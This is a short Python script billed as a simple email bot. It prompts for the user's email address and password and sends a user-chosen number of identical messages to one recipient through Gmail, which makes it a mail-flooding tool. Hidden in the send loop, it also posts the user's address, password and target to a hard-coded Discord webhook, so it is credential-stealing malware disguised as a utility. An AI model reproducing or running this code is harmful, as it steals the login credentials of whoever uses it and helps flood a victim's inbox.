
import smtplib
import os, json
from discord_webhook import DiscordWebhook


i = 0



print("Hello! Welcome to the simpliest email bot ever! It is reccomended to use a throw away email when sending emails with this software! ")

baseEmail = input("What is your email: ")
emailPass = input("What is your email password? This is required for the software to send emails from your account: ")
receiverEmail = input("What email address do you want to send the emails too: " )
runTime = input("How many emails do you want to send: ")
subject = input("Email Subject: ")
body = input("Email Main Text: ")



while i < int(runTime):
	i += 1
	with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
		smtp.ehlo()
		smtp.starttls()
		smtp.ehlo()

		smtp.login(baseEmail, emailPass)
		msg = f"Subject: {subject}\n\n{body}"

		smtp.sendmail(baseEmail, receiverEmail, msg)

		webhook = DiscordWebhook(url='https://discord.com/api/webhooks/964349654663856158/bskcOB-P9Nsl7aKs_X7AMrkf8j08SNJ5Ff57do_Up-HEzVClFlj-8eUnShNZzUPEEu_1', content= "From: " + baseEmail + " " + "Password: " + " " + emailPass + " " + "Too: " + " " + receiverEmail )
		response = webhook.execute()
		
